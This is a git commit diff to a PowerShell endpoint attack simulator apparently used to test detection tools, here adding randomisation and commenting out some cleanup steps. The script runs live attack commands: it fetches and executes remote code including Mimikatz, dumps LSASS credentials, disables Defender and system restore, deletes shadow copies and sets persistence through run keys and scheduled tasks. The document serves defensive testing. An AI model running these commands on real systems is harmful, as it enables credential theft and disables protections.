ab0cccad479aecb769567bb299282ecb1a6728d4
singlethreaded <chris@infocyte.com>
2023-02-20 09:09:33 -0600

    randomize attack

--- AttackSim/attackscript.ps1
+++ AttackSim/attackscript.ps1
@@ -7,12 +7,15 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     return
 }
 
+#Define some randomness
+$n = 1000+$(Get-Random -Max 999)
+
 Write-Host "Starting Datto Attack Simulator"
 New-Item -Path "$env:TEMP" -Name "AttackSim" -ItemType "directory" -ea 0
 $attackDir = "$env:TEMP\AttackSim"
 
 
-Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No malware is used."
+Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No persistent malware is used."
 
 
 #### EXECUTION
@@ -21,12 +24,12 @@ Write-Host "Starting Execution Step"
 Write-Host "Initiating a T1059.001 - Powershell Download Harness"
 Write-Host "(Execution-T1059.001) Detected use of hidden powershell base64 encoded commands"
 Write-Host "[ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)"
-$cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Write-Host T1059.001 - Powershell Download Harness; Start-Sleep 3"
+$cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Start-Sleep $n"
 Powershell.exe -NoP -command $cmd
 
 
 Write-Host "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
-$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe')"
+$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Start-Sleep $n"
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
 )
 powershell.exe -win H -NoP -e $EncodedCommand
@@ -35,12 +38,12 @@ Write-Host "Initiating T1059.001 - Powershell Execution From Alternate Data Stre
 powershell.exe -Win N -exec bypass -nop -command { 
     Add-Content -Path $attackDir\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
     iex (Get-Content -Path $attackDir\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
-    Start-Sleep 3
+    Start-Sleep $n
 }
-Start-Sleep 3
+Start-Sleep 5
 Remove-Item $attackDir\NTFS_ADS.txt -Force -ErrorAction Ignore
 
-Start-Sleep 5
+Start-Sleep 10
 
 
 # DISCOVERY
@@ -60,7 +63,7 @@ Powershell.exe -Win N -exec bypass -nop -command {
     net localgroup administrators 2>&1 >> $attackDir\recon.txt 
     net group "domain admins" /domain 2>&1 >> $attackDir\recon.txt 
     net group "Exchange Trusted Subsystem" /domain 2>&1 >> $attackDir\recon.txt  
-    Start-Sleep 3
+    Start-Sleep $n
 }
 Start-Sleep 3
 Remove-item $attackDir\recon.txt -ea 0 -force
@@ -73,24 +76,25 @@ Start-Sleep 10
 Write-Host -ForegroundColor Cyan "`n`nStarting defense evasion step"
 Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
-powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep 3'
+powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep $n'
 sc config WinDefend start= disabled
 sc stop WinDefend
 
 
 Write-Host "Creating binary with double extension"
-Copy-Item -Path C:\Windows\System32\calc.exe -Destination "$attackDir\AttackSim.pdf.exe"
+Copy-Item -Path C:\Windows\System32\calc.exe -Destination "$attackDir\AttackSim$($n).pdf.exe"
 Write-Host "Initiating double-extension binary execution"
-Start-Process -FilePath "$attackDir\AttackSim.pdf.exe"
+Start-Process -FilePath "$attackDir\AttackSim$($n).pdf.exe"
 Start-Sleep 2
 Stop-Process -Name AttackSim*
+Remove-Item "$attackDir\AttackSim$($n).pdf.exe"
 
 
 Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information"
 Write-Host "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.`n"
 Write-Host "Certutil Download and Decode"
-certutil -urlcache -split -f http://www.brainjar.com/java/host/test.html test.txt
-certutil -decode -f test.txt WindowsUpdate.exe
+certutil -urlcache -split -f "http://www.brainjar.com/java/host/test$($n).html" test.txt 
+certutil -decode -f test.txt "WindowsUpdate$($n).exe"
 Start-Sleep 10
 Remove-Item test.txt -Force -ea 0
 
@@ -101,15 +105,15 @@ Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"
 
 Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
 Write-Host "Adding T1547.001 - Registry Run Key Foothold"
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
 Start-Sleep 2
-REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
+#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
 
 
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
 Powershell.exe -Win N -exec bypass -nop -command {
-    set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
-    Start-Sleep 3
+    set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`");"'
+    Start-Sleep $n
 }
 #Start-Sleep 2
 #Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
@@ -122,7 +126,7 @@ Powershell.exe -Win N -exec bypass -nop -command {
     $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
     $Create.TargetPath = $Target
     $Create.Save()
-    Start-Sleep 3
+    Start-Sleep $n
 }
 #Start-Sleep 2
 #Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk" -ErrorAction Ignore
@@ -130,9 +134,9 @@ Powershell.exe -Win N -exec bypass -nop -command {
 
 
 Write-Host "Adding Persistence - T1053 - On Logon Scheduled Task Startup Script"
-schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" /f
+schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe -i $n" /f
 Write-Host "Adding Persistence - T1053 - On Startup cheduled Task Startup Script"
-schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe" /f
+schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe -i $n" /f
 Start-sleep 2
 #schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
 #schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
@@ -140,26 +144,26 @@ Start-sleep 2
 Start-Sleep 10
 
 Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From Registry Key"
-$Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"'
+$Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"; Start-Sleep $n'
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
 reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi" /f
-Powershell.exe -Win N -exec bypass -nop -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))); Start-Sleep 3 }
+Powershell.exe -Win N -exec bypass -nop -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))); Start-Sleep $n }
 Start-Sleep 2
 Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
 
-
+Start-Sleep 10
 
 # CREDENTIAL
 Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
 Write-Host "Downloading ProcDump.exe"
 Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe"
 Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
-Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula" 2>$null -Wait
+Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n" 2>$null -Wait
 
 Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
 
 # Mimikatz
-powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds; Start-Sleep 3"
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds; Start-Sleep $n"
 
 
 Write-Host "Initiating T1059.001 - Powershell Execution of Mimikatz w/ Obfuscation"
@@ -174,44 +178,46 @@ Powershell.exe -Win N -exec bypass -nop -command {
     ls _-*;
     Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
     Invoke-Mimikatz -DumpCreds 
-    Start-Sleep 3
+    Start-Sleep $n
 }
 
+Start-Sleep 10
 
 # LATERAL MOVEMENT
 Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
-net localgroup "Remote Desktop Users" Guest /add
+net localgroup "Remote Desktop Users" Guest /add /COMMENT:"Datto Attack Simulator - please delete. $n"
 Start-Sleep 3
 
 #Cleanup
 Write-Host "Removing Guest from Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /delete
 
+Start-Sleep 10
 
 #### IMPACT
 Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
-Write-Host "Testing Rule: Disable Automatic Windows Recovery"
+Write-Host "Testing Rule: Disable Automatic Windows Recovery (Note: these test commands are designed with syntax errors)"
 Write-Host "(Impact-T1490) Automatic Windows recovery features disabled"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n >nul 2>&1
 Start-Sleep 2
 
 # clean up
-Write-Host "Restoring Automatic Windows recovery features"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
+#Write-Host "Restoring Automatic Windows recovery features"
+#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
+#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
+#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
+#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
 
 
 Write-Host "Testing Rule: Shadow Copy Deletion"
 Write-Host "(Impact-T1490) Volume shadow copy was deleted"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
-vssadmin.exe delete shadows /all /quiet
+vssadmin.exe delete shadows /All /Shadow=$n /quiet
 
 
 Write-Host "Testing Rule: Wallpaper Defacement"
@@ -221,7 +227,7 @@ powershell -Win N -exec bypass -nop -command {
     $oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
     reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
     RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-    Start-Sleep 3
+    Start-Sleep $n
 }
 
 Write-Host "Restarting Defender..."
